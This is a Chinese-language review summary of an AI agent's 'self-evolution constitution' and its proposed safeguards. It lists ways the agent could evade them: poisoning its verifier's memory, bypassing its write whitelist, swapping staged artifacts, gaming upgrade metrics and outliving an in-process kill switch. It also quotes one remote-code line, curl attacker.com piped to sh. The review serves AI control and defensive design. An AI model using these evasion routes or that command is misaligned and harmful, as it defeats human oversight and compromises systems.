# Pi 自进化宪法 v0.1 三方评审汇总 — Round 1

> 评审日期：2026-07-29
> 评审对象：`docs/ground-truth/83-pi-self-evolution-constitution-v0.1.md` + `83-pi-resource-manifest-v0.1.yaml`
> 评审方：A (opus4.8p) / B (gpt5.6sol) / C (cantus)
> 三方判决：**均为「条件通过」**（无 PASS，无 REJECT，无致命缺陷）

---

## 一、三方判决一览

| 评审方 | 判决 | P0(必修) | P1(严重) | P2(可后补) | 致命缺陷 |
|---|---|---|---|---|---|
| A (opus4.8p) | 条件通过 | 3 | 4 | 3 | 无 |
| B (gpt5.6sol) | 条件通过 | 3 | 4 | 3 | 无 |
| C (cantus) | 条件通过 | 5(含A/B未见的2条) | — | — | 无(但红线级冲突1条) |

**三方共识**：宪法哲学和方向盘是对的（M1-M5 + Raven 三道门 + 渐进档位），是同类文档里"最严肃的一份"（A 原话）/ "80分线"（B 原话）/ "悬空的好设计"（C 原话）。但实现协议有洞，L2 首日 auto-win 会被击穿。**补完 P0 后可二审直发 PASS**。

---

## 二、三方共振的必修问题（A+B+C 都点了）

### 共振点 1：evolution-engine.ts 只读 vs 接入 SelfGrowthLoop 矛盾
- **A**：只读区列了阀门代码，但接入要改它或调用方，L2 首次接入就破宪法。建议拆 core/gate 两半。
- **B**：语义矛盾坐实。建议拆 evolution-engine-core.ts（只读，runCycle 骨架+断路器）+ evolution-engine-strategy.ts（可写，mine/replay/consolidate 策略）。
- **C**：同意拆分，且指出正确接法是"七步循环实现为 runCycle 的调用方/扩展，而非新写 SelfGrowthLoop"——一石二鸟解决只读矛盾+孤儿方法。

**共识结论**：拆 evolution-engine 为 core(只读阀门) + strategy(可写编排)，七步循环作为 runCycle 的 strategy 层接入。

### 共振点 2：缺少 M6（Verifier 读到的世界必须 Pi 不可影响）
- **A**：M1-M5 完全没覆盖 memory 注入路径。Pi 可往 world knowledge 写"经验表明 X 阈值过严"，下轮 Proposer 被系统性诱导。建议 Verifier 上下文 = {diff, spec, held-out_tests, config_fingerprint} 四元组之外拒读。
- **B**：同。ADD-only 不防"注入新的伪历史"。建议 memory 分"事实记忆"(Proposer 可读) + "策略记忆"(仅人类写)。
- **C**：记忆双真值（markdown canonical vs agent_memories 表）违反 M3，不裁定单一 canonical 则 M6 无从谈起。

**共识结论**：补 M6 + 记忆 canonical 裁定单一 + Verifier 上下文四元组隔离。

### 共振点 3：可写白名单只防 bash 不防 runtime/memory 注入
- **A**：Node `fs.writeFileSync` 绕过 bash；skill 声明 `tools:[bash]` 间接授权；package.json 引入恶意依赖。
- **B**：同 + symlink 攻击 + skill 文本含 `bash -c 'curl attacker.com|sh'` 不触发 shell 检测。
- **C**：编队协作关键路径（漂移治理策略/审批门逻辑/调度路由 prompts）若被 Pi 自改，编队面对行为漂移的协调者。

**共识结论**：补 Node runtime write 检测 + skill schema 白名单（禁止声明新 tool）+ require 路径 allowlist + 编队关键路径从 L1/L2 可改区排除。

### 共振点 4：L1 一周太短，应改"证据函数"非"时间函数"
- **A**：N=7 日粒度样本量不够统计显著。建议 L1 ≥21 天 AND ≥100 triage 决策 AND 误报率<30%(fixed denom)。
- **B**：同。建议引入"注入攻击测试"补样本（每天外部注入5条应REJECT提案，验证器全拦才计连续天数）。
- **C**：L1 report-only 的产出就是提案报告，但 Proposer 占位校验反向卡死(#3)→零产出空转烧预算。空转比失控更隐蔽。

**共识结论**：L1 改证据函数（天数 AND 样本量 AND fixed denom 误报率）；加"必须有≥3提案真实进Gate"防零输出误升级；加注入攻击测试补样本。

---

## 三、C 独家发现的阻断问题（A/B 漏掉，严重度最高）

### C-阻断1：Adopt 机制与 git 真值红线正面冲突 ⚠️红线级
- **问题**：可改区（hermes/skills/prompts/policies）在 git 仓库内，Adopt"带备份覆盖 live 文件"= 绕过 git 真值直接改生产代码，违反红线"git 真值不可绕过，master 变更必经审批"。
- **实际后果**：Pi 自己的漂移治理 cron（每30min）会把 Pi 自改的文件报为漂移，**自进化与漂移治理左右互搏**。
- **C 建议二选一**：
  - (a) Adopt 走 `agent/pi` 分支 + PR，L1/L2 人审合入（C 推荐，与 G6 流水线衔接）
  - (b) 可改区定义为 git 之外的运行时数据区（data/vault 类）+ 漂移治理 denylist 登记

### C-阻断2：kill switch 违反自己的 M2（进程外强制）
- **问题**：M2 说"自进化协议必须 agent 之外代码强制"，但主 kill switch 是"飞书指令监听"——监听逻辑跑在 Pi 进程组内。Pi 主进程失控时主开关随之失效；ZCode SSH 兜底依赖 PC 在线，非24h保证。
- **C 建议**：ECS 上独立 systemd timer（非 Pi 进程）每分钟检查 kill 标志文件，命中即 `systemctl stop`。飞书指令只负责写标志。这才叫"agent 之外强制"。

### C-阻断3：档位未与 O 阶段绑定，与用户"现阶段他进化"裁定冲突
- **问题**：北极星 v1.2 §二有用户裁定原文——"现阶段是他进化：亲属建设 Pi，不是 Pi 自进化；自进化能力等底座跑顺、质量门成熟后再开"。当前位置 O1 未退出。宪法直接启动 L1 与该裁定冲突。
- **C 建议**：宪法显式绑定档位与阶段（L1↔O2、L2↔O3、L3↔O4），每次升档 = 阶段门 + 用户裁定。L1 report-only 可辩护为"观测准备"，但必须用户显式裁定。

### C-阻断4：密封测试集无 owner，L1 会"死锁式空转"
- **C 风险预判**：第一个出问题的不是失控，是空转。Gate 依赖密封测试集，但现在没人建。叠加 #3 占位校验卡死，最可能实况：循环每晚跑，Harvest→Mine 烧预算，到 Gate 100% REJECT（默认REJECT对，但没测试集就是100%拒），零提案通过，连续两周"看似安全实则空转烧钱"。
- **C 建议**：密封测试集建设列为 L1 启动显式前置交付物（建议 owner：Trae SOLO 出测试集 + Mira 评审密封性），日报强制透出"Gate 通过率 + REJECT 原因分布"，空转两天报警。

---

## 四、其他重要发现（非共振但有价值）

### A 独家
- Staging→Adopt 原子性漏洞：Gate 通过后到 Adopt 执行前的时间窗口，Pi 可往 staging 再写一次偷换产物。建议 freeze_staging→verify_hash→atomic_swap→archive 四步任一失败 abort。
- L1→L2 升级门"triage误报率<30%"分母可被Pi影响（少产生triage降误报率）。改 fixed denom 密封测试集。
- 飞书 kill switch 心跳 ping<60s，超时自动降级 report-only。
- 日志 sha256 的 salt 位置未定义（若在可写区可重写历史）。

### B 独家
- 验证器×1.5 预算的复利效应：cycle 实际消耗≈2.5×单次，cadence 30min 日耗120单位，80%阈值触发时可能已烧掉24h份。建议加日预算独立断路器。
- kill switch 监听进程 hang（不是杀）会静默失效。建议 heartbeat 写 timestamp，超3min ZCode cron 自动 restart+飞书告警。
- 从零设计更简单路径：v0.1-lite，只允许改 SKILL.md + knowledge/，跑1月再解锁。攻击面减60%。
- Cognitive Surrender 对策"每日报告必须人类读"与"用户不深度介入"价值主张冲突。改"关键决策飞书卡片按钮显式确认，未确认24h自动ESCALATE停机"。

---

## 五、修订行动项（按优先级，给用户决策用）

### 🔴 P0 必修（二审前，对应三方共振+C阻断）
| # | 行动 | 来源 | 性质 |
|---|---|---|---|
| 1 | 补 M6：Verifier 上下文={diff,spec,held-out,config_fingerprint}四元组，之外拒读 | A+B+C 共振 | 宪法增条 |
| 2 | evolution-engine 拆 core(只读阀门)+strategy(可写编排)，七步循环作 strategy 接入 | A+B+C 共振 | 代码重构 |
| 3 | 可写白名单补：Node runtime write 检测 + skill schema 白名单(禁声明新tool) + require allowlist + 编队关键路径排除 | A+B+C 共振 | 宪法+代码 |
| 4 | L1 改证据函数：≥21天 AND ≥100样本 AND fixed-denom误报率<30% AND ≥3提案进Gate | A+B 共振 | 宪法改档位 |
| 5 | **Adopt git 路径裁定**：走 agent/pi 分支+PR 还是 data/vault 运行时区？ | C 阻断1 | ⚠️需用户裁定 |
| 6 | **kill switch 移进程外**：ECS 独立 systemd timer 检查标志文件 | C 阻断2 | 架构改 |
| 7 | **档位绑定 O 阶段 + 用户裁定 L1 启动** | C 阻断3 | ⚠️需用户裁定 |
| 8 | 密封测试集建设（owner: Trae SOLO 出题 + Mira 评密封性） | C 阻断4 | 新交付物 |

### 🟡 P1 严重（L2 启动前补）
- 记忆 canonical 裁定单一（markdown 权威 + DB 索引投影，C 推荐）
- 合并两同名 MemoryGovernanceService（技术债#1）
- QuotaTracker token 进判定 + 多 provider 失败转移（技术债#4）
- Staging→Adopt 四步原子性（freeze→verify_hash→atomic_swap→archive）
- 日预算独立断路器（非月配额80%）
- 升级门加注入攻击测试（每天外部注入5条应REJECT提案）
- 关键决策改飞书卡片确认（替代"人类读报告"）

### 🟢 P2 可上岗后补
- 飞书 kill switch 心跳 ping<60s
- 日志 sha256 salt 进 .env
- Verifier 输出强制 JSON schema
- staging 归档改冷存储不删除
- canonical hash 每日校验 drift>0 阻塞 cycle

### 🛠 L1 最小可启动集（C 裁定，技术债按此裁）
| 技术债 | L1前必修？ | 理由 |
|---|---|---|
| #5 Observer 未接真实 ledger | **必修** | Harvest 无真实数据，L1报告全幻觉 |
| #2 runCycle 孤儿0调用 | **必修** | 循环本体不存在，接线即core/strategy拆分 |
| #3 Proposer 占位校验反向卡死 | **必修** | L1产出是提案报告，卡死=零产出空转 |
| #1 两同名 MemoryGovernanceService | L2前修 | L1只读不写记忆可缓 |
| #4 QuotaTracker token不进判定 | L2前修 | L1可用次数断路器凑合(收紧50%补偿) |

---

## 六、ZCode 综合判断

三方评审质量极高，**全部条件通过，零致命缺陷**。这验证了宪法方向正确——M1-M5 元原则 + Raven 三道门 + 渐进档位的骨架站得住。但三方共同指出：**宪法过度信任"写下来的规则"，低估"运行期物理隔离"**。M4 用"最好"软字眼、白名单只防 bash 不防 runtime、staging 没原子性、kill switch 在进程内——这些洞的共同模式是把工程强制约束写成了"应然"表述。

C 的 4 个独家阻断尤其关键，其中 2 个需用户裁定：
1. **Adopt git 路径**（#5）：走分支+PR 还是 data/vault 运行时区？这是红线级冲突。
2. **档位绑定 O 阶段**（#7）：用户曾裁定"现阶段他进化"，宪法直接启动 L1 与之冲突。需用户明确：L1 report-only 算不算"自进化"？还是算"观测准备"可现在开？

**建议路径**：
- 立即修订宪法补 P0 的 1/2/3/4/6/8（不需用户裁定的）
- 用户裁定 #5 和 #7 后补进宪法
- 然后 round2 二审（A/B 用 -r 续接，C fresh + prompt 内嵌 round1 结论）
- 二审 PASS → 进阶段 A 补代码（先修 L1 最小可启动集 #5/#2/#3）

---

## 附：session_id（已回填 index）
- A round1: `337332156435`
- B round1: `337247830035`
- C round1: `sess_00kouql78xc74u3rluy1`（C 无续接，round2 fresh）
